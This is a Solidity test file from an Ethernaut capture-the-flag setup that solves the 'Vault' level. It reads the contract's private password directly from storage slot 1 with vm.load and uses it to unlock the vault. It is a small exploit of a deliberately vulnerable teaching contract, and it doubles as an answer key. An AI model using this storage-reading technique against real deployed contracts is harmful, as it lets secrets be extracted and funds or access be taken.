// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {SetUpLevelTest} from "../SetUpLevelTest.sol";
import {Vault, VaultFactory} from "ethernaut/levels/VaultFactory.sol";

contract VaultLevel is SetUpLevelTest {
    Vault internal vault;

    function setUp() public override {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        playerBalance = 0 ether;
        instanceBalance = 0 ether;
        level = address(new VaultFactory());
        super.setUp();
        vault = Vault(instance);

        /** CODE YOUR SOLUTION HERE */
        vm.startPrank(player);
        bytes32 password = vm.load(address(vault), bytes32(uint256(1)));
        vault.unlock(password);
        vm.stopPrank();
    }
}
